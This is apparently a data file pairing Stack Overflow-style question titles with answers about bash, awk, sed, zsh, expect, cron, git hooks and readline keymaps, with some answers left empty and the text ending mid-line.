    "Script to change password on linux servers over ssh": "The remote machine(s) do not need expect installed. You can install expect on a local workstation or VM (virtualbox) or whichever *nix box, and write a wrapper that calls this .ex (expect) script (there may be small changes from distro to distro, this tested on CentOS 5/6):\n#!/usr/bin/expect -f\n# wrapper to make passwd(1) be non-interactive\n# username is passed as 1st arg, passwd as 2nd\n\nset username [lindex $argv 0]\nset password [lindex $argv 1]\nset serverid [lindex $argv 2]\nset newpassword [lindex $argv 3]\n\nspawn ssh $serverid passwd\nexpect \"assword:\"\nsend \"$password\\r\"\nexpect \"UNIX password:\"\nsend \"$password\\r\"\nexpect \"password:\"\nsend \"$newpassword\\r\"\nexpect \"password:\"\nsend \"$newpassword\\r\"\nexpect eof",
    "Empty a file while in use in linux": "This should be enough to empty a file:\n> file\nHowever, the other methods you said you tried should also work. If you're seeing weird characters, then they are being written to the file by something else - most probably whatever process is logging there.",
    "How can I add a string to the beginning of each file in a folder in bash?": "This will do that. You could make it more efficient if you are doing the same text to each file...\nfor f in *; do \n  echo \"whatever\" > tmpfile\n  cat $f >> tmpfile\n  mv tmpfile $f\ndone",
    "option requires an argument error": "The : in the getopts specifier is not a separator. From man getopts:\nif a character is followed by a colon, the option is expected to have an argument, which should be separated from it by white space.\nSo if you want an option which doesn't take an argument, simply add the character. If you want it to take an argument, add the character followed by :.",
    "Set shell environment variable via python script": "Setting an environment variable sets it only for the current process and any child processes it launches. So using os.system will set it only for the shell that is running to execute the command you provided. When that command finishes, the shell goes away, and so does the environment variable. Setting it using os.putenv or os.environ has a similar effect; the environment variables are set for the Python process and any children of it.\nI assume you are trying to have those variables set for the shell that you launch the script from, or globally. That can't work because the shell (or other process) is not a child of the Python script in which you are setting the variable.\nYou'll have better luck setting the variables in a shell script. If you then source that script (so that it runs in the current instance of the shell, rather than in a subshell) then they will remain set after the script ends.",
    "Problems with a PHP shell script: \"Could not open input file\"": "",
    "adb pull -> device not found": "",
    "How do I sudo if in Bash?": "if sudo test -d \"/home/otheruser/svn\"; then",
    "how to access last index of array from split function inside awk?": "If your problem is exactly as the example in your question, take the answer from @muzido, $NF will give you the last field.\nIf you just want to know the last element of an array by split():\nsplit() function will return you how many elements it has just \"splitted\", test with your code: awk '{print split($1,A,\".\")}' file you will see the number. Then you can just use it by:\nawk '{n=split($1,A,\".\"); print A[n]}' file \n# n is the length of array A",
    "Shell script to parse through a file ( csv ) and process line by line [duplicate]": "Here's how I would do it.\nFirst i set the IFS environment variable to tell read that \",\" is the field separator.\nexport IFS=\",\"\nGiven the file \"input\" containing the data you provided, I can use the following code:\ncat test | while read a b c d; do echo \"$a:$b:$c:$d\"; done\nTo quickly recap what is going on above. cat test | reads the file and pipes it to while. while runs the code between do and done while read returns true. read reads a line from standard input and separates it into variables (\"a\", \"b\", \"c\" and \"d\") according to the value of $IFS. Finally echo just displays the variables we read.\nWhich gives me the following output\nX1:X2:X3:X4\nY1:Y2:Y3:Y4\nBTW, the BASH manual is always good reading. You'll learn something new every time you read it.",
    "Make Arrow and delete keys work in KornShell command line": "For the arrow keys, you can put this into your the .kshrc file in your home directory:\nset -o emacs\nalias __A=`echo \"\\020\"`     # up arrow = ^p = back a command\nalias __B=`echo \"\\016\"`     # down arrow = ^n = down a command\nalias __C=`echo \"\\006\"`     # right arrow = ^f = forward a character\nalias __D=`echo \"\\002\"`     # left arrow = ^b = back a character\nalias __H=`echo \"\\001\"`     # home = ^a = start of line\nalias __Y=`echo \"\\005\"`     # end = ^e = end of line\nNote that there are two underscore characters before the letters on the left side of the equal sign. On the right-hand side of the equal, the goal is to get the proper control character assigned to the alias. The way this script does that, is by running the command (via back-tics)\necho \"\\020\"\nto get the control-n character assigned to __B.",
    "what does grep -v '^#' do": "^ means \"start of line\"\n# is the literal character #\n-v means \"invert the match\" in grep, in other words, return all non matching lines.\nPut those together, and your expression is \"select all lines that do not begin with #\"\n| is the pipe character, it takes the output of the command on the left hand side, and uses it as the input of the command on the right hand side. bc is like a command line calculator (to do basic math).",
    "bash: put list files into a variable and but size of array is 1": "This:\ndirlist=`ls ${prefix}*.text`\ndoesn't make an array. It only makes a string with space separated file names.\nYou have to do\ndirlist=(`ls ${prefix}*.text`)\nto make it an array.\nThen $dirlist will reference only the first element, so you have to use\n${dirlist[*]}\nto reference all of them in the loop.",
    "Shell script : How to cut part of a string": "I pasted the contents of your example into a file named so.txt.\n$ cat so.txt | awk '{ print $7 }' | cut -f2 -d\"=\"\n9\n10\nExplanation:\ncat so.txt will print the contents of the file to stdout.\nawk '{ print $7 }' will print the seventh column, i.e. the one containing id=n\ncut -f2 -d\"=\" will cut the output of step #2 using = as the delimiter and get the second column (-f2)\nIf you'd rather get id= also, then:\n$ cat so.txt | awk '{ print $7 }' \nid=9\nid=10",
    "Python IDE on Linux Console": "put this line in your .vimrc file:\n:map <F2> :w\\|!python %<CR>\nnow hitting <F2> will save and run your python script",
    "Get the output of a shell Command in VB.net": "You won't be able to capture the output from Shell.\nYou will need to change this to a process and you will need to capture the the Standard Output (and possibly Error) streams from the process.\nHere is an example:\n        Dim oProcess As New Process()\n        Dim oStartInfo As New ProcessStartInfo(\"ApplicationName.exe\", \"arguments\")\n        oStartInfo.UseShellExecute = False\n        oStartInfo.RedirectStandardOutput = True\n        oProcess.StartInfo = oStartInfo\n        oProcess.Start()\n\n        Dim sOutput As String\n        Using oStreamReader As System.IO.StreamReader = oProcess.StandardOutput\n            sOutput = oStreamReader.ReadToEnd()\n        End Using\n        Console.WriteLine(sOutput)\nTo get the standard error:\n'Add this next to standard output redirect\n oStartInfo.RedirectStandardError = True\n\n'Add this below\nUsing oStreamReader As System.IO.StreamReader = checkOut.StandardError\n        sOutput = oStreamReader.ReadToEnd()\nEnd Using",
    "How do I launch an editor from a shell script?": "I answered my own question! You have to redirect terminal input and output:\n#!/bin/tcsh\nvi my_file < `tty` > `tty`",
    "How to configure curl to only show percentage?": "Two modifiers might help, although neither are exact: --silent will suppress all updates and --progress-bar will show a progress bar only.\nEdit: One option to make things easier would be to make a wrapper using Expect to simplify the output to your shell script or whatever is listening to curl.",
    "Does the `shell` in `shell=True` in subprocess mean `bash`?": "http://docs.python.org/2/library/subprocess.html\nOn Unix with shell=True, the shell defaults to /bin/sh\nNote that /bin/sh is often symlinked to something different, e.g. on ubuntu:\n$ ls -la /bin/sh\nlrwxrwxrwx 1 root root 4 Mar 29  2012 /bin/sh -> dash\nYou can use the executable argument to replace the default:\n... If shell=True, on Unix the executable argument specifies a replacement shell for the default /bin/sh.\nsubprocess.call(\"if [ ! -d '{output}' ]; then mkdir -p {output}; fi\",\n                shell=True,\n                executable=\"/bin/bash\")",
    "Shell variable issue when trying to mkdir": "The quotes prevent the expansion of ~.\nUse:\nCLIENT_BUILD_DIR=~/Desktop/TempDir/\n\nif [ ! -d \"$CLIENT_BUILD_DIR\" ]\nthen mkdir \"$CLIENT_BUILD_DIR\"\nfi",
    "How can I put tabs in text files from Terminal? [closed]": "Use echo -e with \\t for a tab. Like this:\necho -e \"ABC 12345 \\t Job Worked on DATE\" >> jobs.txt",
    "Reading file line by line (with space) in Unix Shell scripting - Issue": "Try this,\nIFS=''\nwhile read line\ndo\n    echo $line\ndone < file.txt\nEDIT:\nFrom man bash\nIFS - The Internal Field Separator that is used for word\nsplitting after expansion and to split lines into words\nwith  the  read  builtin  command. The default value is\n``<space><tab><newline>''",
    "Count files and directories using shell script": "Use find as shown below. This solution will count filenames with spaces, newlines and dotfiles correctly.\nFILECOUNT=\"$(find . -type f -maxdepth 1 -printf x | wc -c)\"\nDIRCOUNT=\"$(find . -type d -maxdepth 1 -printf x | wc -c)\"\nNote that the DIRCOUNT includes the current directory (.). If you do not want this, subtract 1.\n((DIRCOUNT--)) # to exclude the current directory",
    "zsh prompt and hostname": "It's a bit of a mess, but you can pretend the %m is a parameter and use parameter expansion to strip the zoltan from the host name:\nPROMPT=\"...${${(%):-%m}#1} ...\"\nA little explanation. First, you create a \"parameter\" expansion that doesn't actually have a parameter name; it just uses the text you provide as the \"value\":\n${:-%m}\nNext, add the % expansion flag so that any prompt escapes found in the value are processed.\n${(%):-%m}\nFinally, next it in a final expansion that uses the # operator to remove a prefix from the string:\n${${(%):-%m}#zoltan-}\nYou can tame your prompt a bit by building up piece by piece (and use zsh's prompt escapes to handle the color changes, rather than embedding terminal control sequences explicitly).\nPROMPT=\"%F{magenta}%n%f\"  # Magenta user name\nPROMPT+=\"@\"\nPROMPT+=\"%F{blue}${${(%):-%m}#zoltan-}%f\" # Blue host name, minus zoltan\nPROMPT+=\" \"\nPROMPT+=\"%F{yellow}%1~ %f\" # Yellow working directory\nPROMPT+=\" %# \"",
    "Handling exit code returned by python in shell script": "The exit code of last command is contained in $?.\nUse below pseudo code:\npython myPythonScript.py\nret=$?\nif [ $ret -ne 0 ]; then\n     #Handle failure\n     #exit if required\nfi",
    "Execute a shell script in release phase on Heroku": "This worked\nchmod u+x release.sh && ./release.sh\nSo Procfile becomes\nrelease: chmod u+x release.sh && ./release.sh\nweb: gunicorn myapp.wsgi --log-file -",
    "Shell script substring from first indexof substring": "Try:\n    $ a=\"some long string\"\n    $ b=\"ri\"\n\n    $ echo ${a/*$b/$b}\n    ring\n\n    $ echo ${a/$b*/$b}\n    some long stri",
    "Calculating rounded percentage in Shell Script without using \"bc\"": "Use AWK (no bash-isms):\nitem=30\ntotal=70\npercent=$(awk \"BEGIN { pc=100*${item}/${total}; i=int(pc); print (pc-i<0.5)?i:i+1 }\")\n\necho $percent\n43",
    "Shell Script - Make directory if it doesn't exist": "if [ -L $dirname]\nLook at the error message produced by this line: \u201c[: missing `]'\u201d or some such (depending on which shell you're using). You need a space inside the brackets. You also need double quotes around the variable expansion unless you use double brackets; you can either learn the rules, or use a simple rule: always use double quotes around variable substitution and command substitution \u2014 \"$foo\", \"$(foo)\".\nif [ -L \"$dirname\" ]\nThen there's a logic error: you're creating the directory only if there is a symbolic link which does not point to a directory. You presumably meant to have a negation in there.\nDon't forget that the directory might be created while your script is running, so it's possible that your check will show that the directory doesn't exist but the directory will exist when you try to create it. Never do \u201ccheck then do\u201d, always do \u201cdo and catch failure\u201d.\nThe right way to create a directory if it doesn't exist is\nmkdir -p -- \"$dirname\"\n(The double quotes in case $dirname contains whitespace or globbing characters, the -- in case it starts with -.)",
    "insert the contents of a file to another (in a specific line of the file that is sent)-BASH/LINUX": "I'd probably use sed for this job:\nline=3\nsed -e \"${line}r file2\" file1\nIf you're looking to overwrite file1 and you have GNU sed, add the -i option. Otherwise, write to a temporary file and then copy/move the temporary file over the original, cleaning up as necessary (that's the trap stuff below). Note: copying the temporary over the file preserves links; moving does not (but is swifter, especially if the file is big).\nline=3\ntmp=\"./sed.$$\"\ntrap \"rm -f $tmp; exit 1\" 0 1 2 3 13 15\nsed -e \"${line}r file2\" file1 > $tmp\ncp $tmp file1\nrm -f $tmp\ntrap 0",
    "How to execute commands within Rake tasks?": "Rake sh built-in task\nThis is probably the best method:\ntask(:sh) do\n  sh('echo', 'a')\n  sh('false')\n  sh('echo', 'b')\nend\nThe interface is similar to Kernel.system but:\nit aborts if the return is != 0, so the above never reaches echo b\nthe command itself is echoed before the output",
    "'app --help' should go to stdout or stderr?": "stdout if the user requested it with --help for example, makes it easier to pipe to less, grep it etc.\nstderr if you are showing the help text because there was a problem, e.g. parsing the command line arguments.",
    "Unix find command, what are the {} and \\; for?": "See man find. (particular the part about -exec)\nWhen using -exec to run a command on each of the files found, the {} is replaced with the name of each file found, and the command is terminated by \\;\nIn your example, all files found under the current directory (.), matching the name *.clj will have the command grep -r resources run on them (to find the string resources if it exists in each of those files).\nIt's actually somewhat redundant, since -r is for recursively searching subdirectories, and that's what find is already doing.",
    "Reading input files by line using read command in shell scripting skips last line": "read reads until it finds a newline character or the end of file, and returns a non-zero exit code if it encounters an end-of-file. So it's quite possible for it to both read a line and return a non-zero exit code.\nConsequently, the following code is not safe if the input might not be terminated by a newline:\nwhile read LINE; do\n  # do something with LINE\ndone\nbecause the body of the while won't be executed on the last line.\nTechnically speaking, a file not terminated with a newline is not a text file, and text tools may fail in odd ways on such a file. However, I'm always reluctant to fall back on that explanation.\nOne way to solve the problem is to test if what was read is non-empty (-n):\nwhile read -r LINE || [[ -n $LINE ]]; do\n  # do something with LINE\ndone\nOther solutions include using mapfile to read the file into an array, piping the file through some utility which is guaranteed to terminate the last line properly (grep ., for example, if you don't want to deal with blank lines), or doing the iterative processing with a tool like awk (which is usually my preference).\nNote that -r is almost certainly needed in the read builtin; it causes read to not reinterpret \\-sequences in the input.",
    "Why am I getting \": No such file or directory\" when trying to execute a bash script?": "I have seen this error if the script has windows line endings instead of unix line endings. Try running dos2unix on the script and see if you get the same error.",
    "cat file | ... vs ... <file": "When reading from a regular file, cat is in charge of reading the data, performs it as it pleases, and might constrain it in the way it writes it to the pipeline. Obviously, the contents themselves are preserved, but anything else could be tainted. For example: block size and data arrival timing. Additionally, the pipe in itself isn't always neutral: it serves as an additional buffer between the input and ....\nQuick and easy way to make the block size issue apparent:\n$ cat large-file | pv >/dev/null\n5,44GB 0:00:14 [ 393MB/s] [              <=>                                  ]\n$ pv <large-file >/dev/null\n5,44GB 0:00:03 [1,72GB/s] [=================================>] 100%",
    "parallel call multiple bash functions": "Run them in background. And then wait for them to complete.\na() {\n  echo \"download a\"\n  wget fileA\n}\n\nb() {\n  echo \"download b\"\n  wget fileB\n}\n\na &\nb &\nwait # waits for all background processes to complete",
    "Access to environment variables from Android Studio gradle build": "",
    "Bash scripting unexpected operator": "if [ \"a\" == \"a\" ] should be if [ \"a\" = \"a\" ].\nbash accepts == instead of =, but your /bin/sh probably isn't bash.\nSo either change the == to =, or your shebang to #!/bin/bash",
    "zsh not re-computing my shell prompt": "I ran into the same problem while customizing my prompt in zsh.\nI believe this happens because the shell interpolates the value into the string once, when the prompt is initialized. Subsequent reloads have the constant string in your prompt, not the subshell interpolation.\nInstead, put any lines that involve subshells into a variable defined with single quotes. Then interpolate that variable instead.\nautoload -U colors && colors\n\nlocal parse_special='%{$fg[yellow]%}$(date)%{$reset_color%}'\n\nPS1=\"%{$fg[green]%}%n@%m %{$fg[blue]%}%c ${parse_special} %# \"\nUpdate: Adding this from ZyX's answer to make a complete solution for this. You also need to add this:\nsetopt promptsubst\nIn fact, I would suggest extracting each part of your prompt into a variable like this, including a reset_color on each. Doing so lets you change the order of prompt components without changing their implementation.",
    "Multiple grep search/ignore patterns": "Just pipe your unfiltered output into a single instance of grep and use an extended regexp to declare what you want to ignore:\ngrep -Ri 64 src/install/ | grep -v -E '(\\.svn|file|2\\.5|2\\.6)'\nEdit: To search multiple files maybe try\nfind ./src/install -type f -print |\\\n    grep -v -E '(\\.svn|file|2\\.5|2\\.6)' | xargs grep -i 64\nEdit: Ooh. I forgot to add the simple trick to stop a cringeable use of multiple grep instances, namely\nps -ef | grep something | grep -v grep\nReplacing that with\nps -ef | grep \"[s]omething\"\nremoves the need of the second grep.",
    "How to remove only the first occurrence of a line in a file using sed": "You could make use of two-address form:\nsed '0,/tat/{/tat/d;}' inputfile\nThis would delete the first occurrence of the pattern.\nQuoting from info sed:\n A line number of `0' can be used in an address specification like\n `0,/REGEXP/' so that `sed' will try to match REGEXP in the first\n input line too.  In other words, `0,/REGEXP/' is similar to\n `1,/REGEXP/', except that if ADDR2 matches the very first line of\n input the `0,/REGEXP/' form will consider it to end the range,\n whereas the `1,/REGEXP/' form will match the beginning of its\n range and hence make the range span up to the _second_ occurrence\n of the regular expression.",
    "Calling 'git pull' from a git post-update hook": "You have various diagnostics to run as suggested in this SO answer.\nIn particular, check out the the value of GIT_DIR and GIT_WORK_TREE.\nWhile the hook is running, GIT_DIR and (if the worktree can't be inferred from GIT_DIR) GIT_WORK_TREE are set.\nThat means your pull won't run with the repository in the directory you changed to.\nSee also blog post Using Git Inside a Git Hook:\nEventually we got our linux guru over and he noticed that the environment under which the git user runs is totally different when inside a hook.\nGitolite does a bunch of things to the env, but the one that was screwing us up was the setting of the GIT_DIR.\nAfter we figured that out, the solution was as easy as:\nENV.delete 'GIT_DIR'\nin our ruby script that is triggered by the 'post-receive' hook.\nSame deal in Git Tip: Auto update working tree via post-receive hook, but with an elegant way out of this:\nThe solution?\nIt turns out the post-receive hook starts out with the GIT_DIR environment variable set to the repo/.git folder, so no matter what path you 'cd' into it will always try to run any following git commands there.\nFixing this is simply a matter of unsetting the GIT_DIR\n(thanks to Ulrich Petri for the elegant env -i solution):\n#!/bin/sh\ncd ..\nenv -i git reset --hard",
    "How to disable Python shell spawning \"less\" with \"help\"": "This also seems to work:\n>>> import pydoc\n>>> pydoc.pager = pydoc.plainpager\nThis works even if you have already invoked the help command, as it replaces the cached version in pydoc.py.",
    "Running a simple shell script as a cronjob": "The easiest way would be to use a GUI:\nFor Gnome use gnome-schedule (universe)\nsudo apt-get install gnome-schedule \nFor KDE use kde-config-cron\nIt should be pre installed on Kubuntu\nBut if you use a headless linux or don\u00b4t want GUI\u00b4s you may use:\ncrontab -e\nIf you type it into Terminal you\u00b4ll get a table.\nYou have to insert your cronjobs now.\nFormat a job like this:\n*     *     *     *     *  YOURCOMMAND\n-     -     -     -     -\n|     |     |     |     |\n|     |     |     |     +----- Day in Week (0 to 7) (Sunday is 0 and 7)\n|     |     |     +------- Month (1 to 12)\n|     |     +--------- Day in Month (1 to 31)\n|     +----------- Hour (0 to 23)\n+------------- Minute (0 to 59)\nThere are some shorts, too (if you don\u00b4t want the *):\n@reboot --> only once at startup\n@daily ---> once a day\n@midnight --> once a day at midnight\n@hourly --> once a hour\n@weekly --> once a week\n@monthly --> once a month\n@annually --> once a year\n@yearly --> once a year\nIf you want to use the shorts as cron (because they don\u00b4t work or so):\n@daily --> 0 0 * * *\n@midnight --> 0 0 * * *\n@hourly --> 0 * * * *\n@weekly --> 0 0 * * 0\n@monthly --> 0 0 1 * *\n@annually --> 0 0 1 1 *\n@yearly --> 0 0 1 1 *",
    "Managing error handling while running sqlplus from shell scripts": "What Max says is correct. Try this modified script\n#!/bin/sh\n\necho \"Please enter evaluate database username\"\nread eval_user\necho \"Please enter evaluate database password\"\nread eval_pass\necho \"Please enter the database name\"\nread db_name\n\nLOGFILE=shell_log.txt\n\nsqlplus -s /nolog <<-EOF>> ${LOGFILE}\nWHENEVER OSERROR EXIT 9;\nWHENEVER SQLERROR EXIT SQL.SQLCODE;\nconnect $eval_user/$eval_pass@$db_name\nDBMS_OUTPUT.put_line('Connected to db');\nEOF\n\nsql_return_code=$?\n\nif [ $sql_return_code != 0 ]\nthen\necho \"The upgrade script failed. Please refer to the log results.txt for more information\"\necho \"Error code $sql_return_code\"\nexit 0;\nfi\nPlease note the use of sql_return_code to capture the SQLPLUS return code.\nThe DBMS_OUTPUT statement should fail with error - \"SP2-0734: unknown command beginning...\". You can find the error message in log file.\nIt is possible to trap the sp2 errors in SQLPLUS 11g using the error logging facility. Please have a look at http://tkyte.blogspot.co.uk/2010/04/new-thing-about-sqlplus.html for more information.",
    "ADB Shell giving bad mode when executing chmod (under su)": "",
    "Redirect output to a bash array": "do you really need an array\nbash\n$ ipAddress=\"10.78.90.137;10.78.90.149\"\n$ IFS=\";\"\n$ set -- $ipAddress\n$ echo $1\n10.78.90.137\n$ echo $2\n10.78.90.149\n$ unset IFS\n$ echo $@ #this is \"array\"\nif you want to put into array\n$ a=( $@ )\n$ echo ${a[0]}\n10.78.90.137\n$ echo ${a[1]}\n10.78.90.149\n@OP, regarding your method: set your IFS to a space\n$ IFS=\" \"\n$ n=( $(grep -i ipaddress file |  cut -d'=' -f2 | tr ';' ' ' | sed 's/\"//g' ) )\n$ echo ${n[1]}\n10.78.90.149\n$ echo ${n[0]}\n10.78.90.137\n$ unset IFS\nAlso, there is no need to use so many tools. you can just use awk, or simply the bash shell\n#!/bin/bash\ndeclare -a arr\nwhile IFS=\"=\" read -r caption addresses\ndo\n case \"$caption\" in \n    ipAddress*)\n        addresses=${addresses//[\\\"]/}\n        arr=( ${arr[@]} ${addresses//;/ } )\n esac\ndone < \"file\"\necho ${arr[@]}\noutput\n$ more file\nfoo\nbar\nipAddress=\"10.78.91.138;10.78.90.150;10.77.1.101\"\nfoo1\nipAddress=\"10.78.90.137;10.78.90.149\"\nbar1\n\n$./shell.sh\n10.78.91.138 10.78.90.150 10.77.1.101 10.78.90.137 10.78.90.149\ngawk\n$ n=( $(gawk -F\"=\" '/ipAddress/{gsub(/\\\"/,\"\",$2);gsub(/;/,\" \",$2) ;printf $2\" \"}' file) )\n$ echo ${n[@]}\n10.78.91.138 10.78.90.150 10.77.1.101 10.78.90.137 10.78.90.149",
    "Emacs switching out of terminal": "In terminal mode you have to use C-c o to switch to the other buffer. C-c is the \"terminal escape character\"\nhttp://www.gnu.org/s/libtool/manual/emacs/Terminal-emulator.html",
    "How to select a given column from a line of text?": "word=$(cut -d ' ' -f 3 filename)\ncut gives us the third field of each line (in this case there's 1). -d is used to specify space as a delimiter. $() captures the output, then we assign it to the word variable.",
    "Conda command working in command prompt but not in bash script": "I solved the problem thanks to @darthbith 's comment.\nSince conda is a bash function and bash functions can not be propagated to independent shells (e.g. opened by executing a bash script), one has to add the line\nsource /opt/anaconda/etc/profile.d/conda.sh\nto the bash script before calling conda commands. Otherwise bash will not know about conda.",
    "JQ issues with comments on Json file": "JSON and thus jq do not support comments (in the usual sense) in JSON input. The jq FAQ lists a number of tools that can be used to remove comments, including jsonlint, json5, and any-json. I'd recommend one that can act as a filter.\nFor NDJSON with #-style comments on separate lines, you could use jq by filtering out the #-style comments as follows:\njq -Rcn '\n  def iterate(f): def r: f | (., r); r;\n  iterate(try (inputs|fromjson) catch infinite)\n  | select(isinfinite|not)'\n(This also works with gojq and jaq, the Go and Rust implementation of jq.)\nSee https://github.com/stedolan/jq/wiki/FAQ#processing-not-quite-valid-json for links and further details.\n\u2014\u2014\nIt might be worth pointing out that jq can be used to process JSON with #-style comments, at least if the JSON is not too large to be processed as a jq program. For example, you could use jq with the -f option to read a JSON file as a jq program.",
    "IntelliJ does not recognize PATH variable": "You can actually use \"open -a [IntelliJ App]\" on mac from the command line and it should pick up your path variables for your .bash_profile and/or .zshrc - better than cutting and pasting into IntelliJ IMO. Seems to be a mac only issue if I'm not mistaken.",
    "Run a script piped from stdin (Linux/Shell Scripting)": "Just pipe it to your favorite shell, for example:\n$ cat my_script.sh\nset -x\necho hello\n$ cat my_script.sh | sh\n+ echo hello\nhello\n(The set -x makes the shell print out each statement it is about to run before it runs it, handy for debugging, but it has nothing to do with your issue specifically - just there for demo purposes.)",
    "How to pipe a here-document through a command and capture the result into a variable?": "The cat ... | isn't necessary.\nfoo=$(sed 's/-/_/g' << EOF\n1-2\n3-4\nEOF\n)",
    "Parse JSON to array in a shell script": "If you really cannot use a proper JSON parser such as jq[1] , try an awk-based solution:\nBash 4.x:\nreadarray -t values < <(awk -F\\\" 'NF>=3 {print $4}' myfile.json)\nBash 3.x:\nIFS=$'\\n' read -d '' -ra values < <(awk -F\\\" 'NF>=3 {print $4}' myfile.json)\nThis stores all property values in Bash array ${values[@]}, which you can inspect with\ndeclare -p values.\nThese solutions have limitations:\neach property must be on its own line,\nall values must be double-quoted,\nembedded escaped double quotes are not supported.\nAll these limitations reinforce the recommendation to use a proper JSON parser.\nNote: The following alternative solutions use the Bash 4.x+ readarray -t values command, but they also work with the Bash 3.x alternative, IFS=$'\\n' read -d '' -ra values.\ngrep + cut combination: A single grep command won't do (unless you use GNU grep - see below), but adding cut helps:\nreadarray -t values < <(grep '\"' myfile.json | cut -d '\"' -f4)\nGNU grep: Using -P to support PCREs, which support \\K to drop everything matched so far (a more flexible alternative to a look-behind assertion) as well as look-ahead assertions ((?=...)):\nreadarray -t values < <(grep -Po ':\\s*\"\\K.+(?=\"\\s*,?\\s*$)' myfile.json)\nFinally, here's a pure Bash (3.x+) solution:\nWhat makes this a viable alternative in terms of performance is that no external utilities are called in each loop iteration; however, for larger input files, a solution based on external utilities will be much faster.\n#!/usr/bin/env bash\n\ndeclare -a values # declare the array                                                                                                                                                                  \n\n# Read each line and use regex parsing (with Bash's `=~` operator)\n# to extract the value.\nwhile read -r line; do\n  # Extract the value from between the double quotes\n  # and add it to the array.\n  [[ $line =~ :[[:blank:]]+\\\"(.*)\\\" ]] && values+=( \"${BASH_REMATCH[1]}\" )\ndone < myfile.json                                                                                                                                          \n\ndeclare -p values # print the array\n[1] Here's what a robust jq-based solution would look like (Bash 4.x):\nreadarray -t values < <(jq -r '.[]' myfile.json)",
    "Circumvent the sed backreference limit \\1 through \\9": "Can you user perl -pe 's/(match)(str)/$2$1/g;' in place of sed? The way to circumvent the backreference limit is to use something other than sed.\nAlso, I suppose you could do your substitution in two steps, but I don't know your pattern so I can't help you out with how.",
    "In bash what does ! (exclamation mark) before command means?": "In bash, if you type ! followed by a command name, it will substitute it with the last command in your history starting by that name.\nSo in your case !git was substituted with git clone somerepo so the whole line was translated to git clone somerepo status",
    "How to parse a command output in shell script": "you can use cut or sed, anyone implementation is good enough to use,\n[root@giam20 ~]# sestatus\nSELinux status:                 enabled\nSELinuxfs mount:                /selinux\nCurrent mode:                   enforcing\nMode from config file:          enforcing\nPolicy version:                 24\nPolicy from config file:        targeted\n[root@giam20 ~]# variable=`sestatus | grep 'Current mode'|cut -f2 -d \":\"`\n[root@giam20 ~]# echo $variable\nenforcing\n[root@giam20 ~]#\nthis is simple to write than above.",
    "Is there a convention for naming 'private functions' in bash?": "For what it's worth, Red Hat's /etc/init.d/functions script uses double underscores.\n# __umount_loop awk_program fstab_file first_msg retry_msg umount_args\n# awk_program should process fstab_file and return a list of fstab-encoded\n# paths; it doesn't have to handle comments in fstab_file.\n__umount_loop() {\n    # ...\n}\n\n# Similar to __umount loop above, specialized for loopback devices\n__umount_loopback_loop() {\n    # ...\n}\n\n# __proc_pids {program} [pidfile]\n# Set $pid to pids from /var/run* for {program}.  $pid should be declared\n# local in the caller.\n# Returns LSB exit code for the 'status' action.\n__pids_var_run() {\n    # ...\n}\n\n# A sed expression to filter out the files that is_ignored_file recognizes\n__sed_discard_ignored_files='/\\(~\\|\\.bak\\|\\.orig\\|\\.rpmnew\\|\\.rpmorig\\|\\.rpmsave\\)$/d'",
    "In sed, how to represent \"alphanumeric or _ or -\"": "That will be this character class:\n[[:alnum:]_-]\nWhich means allow one of these:\n1. Alpha numeric\n1. Underscore\n1. Hyphen\nIt is important to keep hyphen at 1st or last position in character class to avoid escaping.",
    "What does \"set keymap vi\" do?": "TL;DR\nIf you don't want to change/add bindings in the default keymaps, you don't need the line keymap vi.\nWhat keymap vi does is state that any bindings listed after that point apply to that keymap (which is exactly the same keymap as vi-command and vi-move).\nIf you want to change the insertion keymap (eg to add a Ctrl-A binding to go the beginning of the line while you're typing), you'll need to do this below a keymap vi-insert line.\nIf you want further info on the vi mode and maps, skip to the heading editing-mode vi (the last one).\nBut wait! There's a fair bit of background info that may be needed though: eg, the difference between an editing-mode and a keymap.\nParticularly useful is the concept of a hybrid emacs keymap for inserting text and while still easily getting to vi-command for making changes.\nWhat is the difference between an editing-mode and a keymap?\nThere are only two editing-modes: emacs (the default) and vi.\nThe GNU Readline Library documentation says:\nediting-mode\n    The editing-mode variable controls which default set of key bindings is\n    used. By default, Readline starts up in Emacs editing mode, where the\n    keystrokes are most similar to Emacs. This variable can be set to either\n    `emacs' or `vi'.\nNote the difference between editing-mode and keymap: In editing-mode vi the two (yes there's only two, read on) keymaps are swapped in and out to emulate the different modes of the vi editor. ALL the emacs ones operate at the same time in editing-mode emacs (explained later).\nSo what does editing-mode actually do? It just sets the active keymap upon shell startup to either emacs or vi-insert.\nWhat are the unique keymaps?\nAcceptable keymap names are emacs, emacs-standard, emacs-meta, emacs-ctlx,\nvi, vi-move, vi-command, and vi-insert.\n\nvi is equivalent to vi-command; emacs is equivalent to emacs-standard.\nWhile not documented, vi/vi-command and vi-move keymaps are also equivalent:\n+ravi@boxy:~$ diff <(bind -pm vi) <(bind -pm vi-move)\n+ravi@boxy:~$ \nThis leaves us with: emacs, emacs-meta, emacs-ctlx, vi, and vi-insert as unique keymaps to explain. Differentiating the keymaps is probably best done by inspecting them...\nWhat are the keymaps default bindings?\nTo view the default keybindings for (example) emacs (the default), use:\nINPUTRC=~/dev/null bash -c 'bind -pm emacs' | grep -v '^#\nYou can replace emacs with any other keymap name in the example above.\nThere are many lines saying self-insert or do-lowercase-version which aren't very useful, so to remove them:\nINPUTRC=~/dev/null bash -c 'bind -pm emacs' | grep -vE '^#|: (do-lowercase-version|self-insert)$' | sort\nWhat is the difference between the various emacs keymaps?\nTL;DR: They are different views on a single set of mappings applied to editing-mode emacs.\nIf you the output of the second command into the files called emacs-standard, emacs-meta, emacs-ctlx, vi-command, and vi-insert for their corresponding keymaps, you can find out that:\nThere are NO commands mapped in emacs-meta and emacs-ctlx which don't also appear in emacs-standard:\n$ comm -13 <(sed -r 's/.*: (\\S+)/\\1/' emacs-standard|sort) <(sed -r 's/.*: (\\S+)/\\1/' emacs-ctlx|sort)\n$ comm -13 <(sed -r 's/.*: (\\S+)/\\1/' emacs-standard|sort) <(sed -r 's/.*: (\\S+)/\\1/' emacs-meta|sort)\n$\nSo emacs/emacs-standard is a behaviourally functional superset of both emacs-ctlx and emacs-meta This means that:\nkeymap emacs\n\"\\eg\": glob-expand-word\n\"\\C-x\\C-r\": re-read-init-file\nIs functionally equivalent to:\nkeymap emacs-meta\n\"g\": glob-expand-word\n\nkeymap emacs-ctlx\n\"\\C-r\": re-read-init-file\nYou might argue that the second form is easier to read.\nInserting text: emacs vs vi-insert\nThere are 28 commands in emacs-standard not in vi-insert\n+ravi@boxy:~/lib/readline$ comm -12 vi-insert emacs-standard |wc 